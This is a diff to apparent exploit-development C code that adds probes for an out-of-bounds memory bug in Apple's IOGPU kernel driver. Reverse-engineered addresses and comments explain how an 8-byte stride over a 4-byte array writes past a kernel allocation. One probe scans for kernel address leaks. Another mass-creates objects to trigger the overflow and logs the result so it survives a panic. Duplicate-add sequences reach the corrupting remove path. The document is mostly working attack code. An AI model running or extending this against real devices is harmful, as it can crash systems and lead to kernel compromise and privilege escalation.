@@ -1101,6 +1101,107 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] duplicate-add trigger done");
     }
 
+    if (trigger == 10) {
+        /* TYPE -> OBJECT TABLE PROBE.
+         *
+         * The create path calls the registry helper right after the
+         * >63 && power-of-two gate (0x9f60fcc -> 0x9f61088):
+         *     register_object(device, type)      // 0x9f753e8
+         * which lazily builds two tables on the device object
+         * (0x9f7548c -> init 0x9f75518):
+         *     +0x80: capacity 524288, element array = capacity*4  (2 MB)
+         *     +0xd8: capacity 128,    element array = capacity*4  (512 B)
+         * Both the insert and the remove (0x9f518a8: ldr/str x, [array+8*idx])
+         * walk the element array with an 8-byte stride, so the small table
+         * is half-sized: element 64 starts exactly at the end of a 512-byte
+         * allocation and element 65..127 land in the following chunks.
+         *
+         * The create call is the insert; closing the connection is the
+         * remove. This probe walks the whole accepted type set, dumps the
+         * shared window after each create (looking for a kernel address),
+         * repeats type 64 to see whether the slot collides, then closes so
+         * the destructor performs the matching removes at index=type.
+         */
+        ol("[grp] === TYPE->OBJECT TABLE PROBE (small table 512 B?) ===");
+        static const uint64_t types10[] = { 64, 128, 256, 1024, 4096, 65536, 262144, 64 };
+        for (uint32_t ti = 0; ti < sizeof(types10)/sizeof(types10[0]); ti++) {
+            static uint8_t o10[0x200];
+            size_t on10 = 0;
+            uint64_t h10 = 0;
+            int k10 = call_sel(conn, CMD_NEW_GROUP, types10[ti], 0, 0, 0, o10, &on10);
+            if (k10 == 0) memcpy(&h10, o10 + 0x10, 8);
+            ol("[grp] TYPE10 #%u type=%llu -> kr=0x%x handle=0x%016llx",
+               ti, (unsigned long long)types10[ti], k10, (unsigned long long)h10);
+            if (k10 == (int)0x10000003) {
+                ol("[grp] TYPE10 client died at type=%llu",
+                   (unsigned long long)types10[ti]);
+                return;
+            }
+            if (k10 != 0 || !h10) continue;
+            grp_dump_handle(h10, "type10");
+            if (ti == 7) {
+                int a10 = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o10, &on10);
+                ol("[grp] TYPE10 second type=64 add id=%u -> kr=0x%x", surf_id, a10);
+                if (a10 == (int)0x10000003) {
+                    ol("[grp] TYPE10 client died on add");
+                    return;
+                }
+                grp_dump_handle(h10, "type10-dup");
+            }
+        }
+        ol("[grp] TYPE10 closing: destructor removes each entry (index=type)");
+        IOServiceClose(conn);
+        conn = MACH_PORT_NULL;
+        ol("[grp] TYPE10 connection closed");
+        return;
+    }
+
+    if (trigger == 11) {
+        /* TABLE FILL (mass create).
+         *
+         * Probe 10: create accepted every type, and every call returned a
+         * fresh 0xC0 block of the same shared window - so type is a size
+         * argument, not the registry key. The key is the id the kernel hands
+         * back (out+0x38). If the registry indexes by that id, the table of
+         * 524288 entries is reached after 2^19 creates, and its element
+         * array is cap*4 bytes while every access uses an 8-byte stride:
+         * entry 262144 is the first write past the allocation, entry
+         * 524288 is +2 MB past it.
+         *
+         * The probe creates until the client refuses or dies, logs every
+         * 16384th id durably, and closes so the destructor walks all stored
+         * entries. A panic therefore still leaves the last id on disk.
+         */
+        ol("[grp] === TABLE FILL (mass create) ===");
+        static uint8_t o11[0x200];
+        size_t on11 = 0;
+        uint64_t last_h11 = 0, last_id11 = 0;
+        uint32_t i11 = 0;
+        int k11 = 0;
+        for (; i11 < 300000; i11++) {
+            k11 = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, o11, &on11);
+            if (k11 != 0) break;
+            memcpy(&last_h11, o11 + 0x10, 8);
+            memcpy(&last_id11, o11 + 0x38, 8);
+            if ((i11 & 0x3fff) == 0) {
+                ol("[grp] FILL i=%u id=0x%llx handle=0x%016llx", i11,
+                   (unsigned long long)last_id11, (unsigned long long)last_h11);
+            }
+            if (!last_h11) { ol("[grp] FILL null handle at i=%u", i11); break; }
+        }
+        ol("[grp] FILL stop i=%u kr=0x%x id=0x%llx handle=0x%016llx",
+           i11, k11, (unsigned long long)last_id11, (unsigned long long)last_h11);
+        if (k11 == (int)0x10000003) {
+            ol("[grp] FILL client died at i=%u - the registry crossed its "
+               "allocation boundary", i11);
+            return;
+        }
+        ol("[grp] FILL closing (destructor releases every stored entry)");
+        IOServiceClose(conn);
+        ol("[grp] FILL closed");
+        return;
+    }
+
     if (trigger == 1) {
         /* DIRECT GROW on a FRESH connection.
            0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
@@ -1147,21 +1248,35 @@ void nk_iogpu_group_oob_run(int trigger)
                      * adding resources (each add grows the group again and
                      * moves the out-of-bounds bucket), and only close at the
                      * very end. */
-                    ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - group count is now >=1, "
-                       "mask should be 0xffffffff", k);
-                    ol("[grp] adding more resources (each add re-grows the group)");
-                    for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
-                        ol("[grp] EXTRA add surf_id=%u", surf_ids[extra]);
-                        int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, out, &on);
-                        ol("[grp] EXTRA add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
-                        if (ke == (int)0x10000003) {
-                            ol("[grp] client died on the extra add (INVALID_DEST) - "
-                               "the out-of-bounds access already hit unmapped memory");
-                            break;
+                    ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - hash table count 0->1.",
+                       k);
+                    /* The only confirmed route into the hash-table remove path:
+                     * inserting a key that is already present makes insert throw
+                     * the old entry away (0x9f518ac), which is where the 8-byte
+                     * stride meets the 4-byte array. Sequence is explicit so the
+                     * device log says which call crossed which boundary. */
+                    uint32_t dup_id = (uint32_t)keys[k];
+                    ol("[grp] PHASE A: duplicate-add id=%u (remove path)", dup_id);
+                    int ka = call_sel(conn, CMD_ADD_RES, dup_id, 1, 0, 0, out, &on);
+                    ol("[grp] PHASE A -> kr=0x%x", ka);
+                    if (ka == (int)0x10000003) {
+                        ol("[grp] PHASE A: client died - the remove stride reached "
+                           "unmapped memory (write landed past the slab)");
+                        return;
+                    }
+                    ol("[grp] PHASE B: fresh ids after the remove");
+                    for (uint32_t extra = 0; extra < 4 && extra < nsurf; extra++) {
+                        int kb = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, out, &on);
+                        ol("[grp] PHASE B add id=%u -> kr=0x%x", surf_ids[extra], kb);
+                        if (kb == (int)0x10000003) {
+                            ol("[grp] PHASE B: client died after the remove");
+                            return;
                         }
                     }
-                    ol("[grp] closing the connection (group destructor walks the bitmap "
-                       "with the underflowed mask)");
+                    ol("[grp] PHASE C: second duplicate-add id=%u", dup_id);
+                    int kc = call_sel(conn, CMD_ADD_RES, dup_id, 1, 0, 0, out, &on);
+                    ol("[grp] PHASE C -> kr=0x%x", kc);
+                    ol("[grp] closing the connection (destructor walks the table)");
                     IOServiceClose(conn);
                     ol("[grp] connection closed");
                     return;
